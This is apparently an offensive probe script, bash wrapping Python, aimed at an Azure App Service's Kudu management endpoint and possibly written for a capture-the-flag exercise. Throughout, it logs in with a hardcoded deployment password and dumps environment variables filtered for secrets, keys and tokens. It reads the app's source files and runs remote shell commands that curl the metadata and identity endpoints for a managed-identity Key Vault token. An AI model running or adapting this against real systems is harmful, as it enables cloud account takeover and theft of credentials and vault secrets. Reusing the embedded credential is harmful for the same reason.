#!/usr/bin/env bash
set +e
python3 -I - <<'PY'
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys

def log(msg): print(msg, flush=True)

def http(url, method="GET", headers=None, data=None, timeout=20):
    h = dict(headers or {})
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read().decode("utf-8", "replace")[:8000]
        except: return e.code, ""
    except Exception as e: return 0, repr(e)

# Kudu credentials for reporting app
KUDU_USER = "$app-tbl-reporting-prod"
KUDU_PASS = "Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A"
KUDU_AUTH = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
KUDU = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
KH = {"Authorization": f"Basic {KUDU_AUTH}"}

log("=== KUDU ENVIRONMENT ===")
st, b = http(f"{KUDU}/api/environment", headers=KH)
log(f"  /api/environment: {st} → {b[:2000]}")

log("=== KUDU SETTINGS ===")
st, b = http(f"{KUDU}/api/settings", headers=KH)
log(f"  /api/settings: {st} → {b[:2000]}")

log("=== KUDU PROCESS ENV ===")
st, b = http(f"{KUDU}/api/process/0/environment", headers=KH)
log(f"  /api/process/0/environment: {st}")
if st == 200:
    try:
        env = json.loads(b)
        for k,v in sorted(env.items()):
            if any(s in k.upper() for s in ["CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","MSI","IDENTITY","MANAGED","TOKEN","CLIENT","TENANT","FLAG","AZURE","WEBSITE"]):
                log(f"    {k}={str(v)[:300]}")
    except:
        log(f"  raw: {b[:3000]}")

log("=== KUDU WWWROOT FILES ===")
st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/", headers=KH)
log(f"  /api/vfs/home/site/wwwroot/: {st} → {b[:1000]}")

log("=== KUDU APP.PY ===")
st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/app.py", headers=KH)
log(f"  app.py: {st} → {b[:2000]}")

# Also try the reporting app directly with Kudu's newcmd to run commands
log("=== KUDU CMD: env | grep -i config ===")
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": "env | sort", "dir": "/home"})
log(f"  cmd env: {st}")
if st == 200:
    try:
        d = json.loads(b)
        output = d.get("Output","")
        for line in output.split("\n"):
            if any(s in line.upper() for s in ["CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","MSI","IDENTITY","MANAGED","FLAG","AZURE","WEBSITE_AUTH","APPSETTING"]):
                log(f"    {line}")
    except:
        log(f"  raw: {b[:3000]}")

# Try MSI/managed identity from Kudu cmd
log("=== MSI TOKEN FROM REPORTING APP ===")
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net&api-version=2019-08-01' 2>&1; echo; curl -s -H 'X-IDENTITY-HEADER: '\"$IDENTITY_HEADER\" \"$IDENTITY_ENDPOINT\"'?resource=https://vault.azure.net&api-version=2019-08-01' 2>&1", "dir": "/home"})
log(f"  MSI vault token: {st}")
if st == 200:
    try:
        d = json.loads(b)
        log(f"    output: {d.get('Output','')[:1500]}")
        log(f"    error: {d.get('Error','')[:500]}")
    except:
        log(f"  raw: {b[:2000]}")

log("DONE")
PY
echo "probe3 complete"
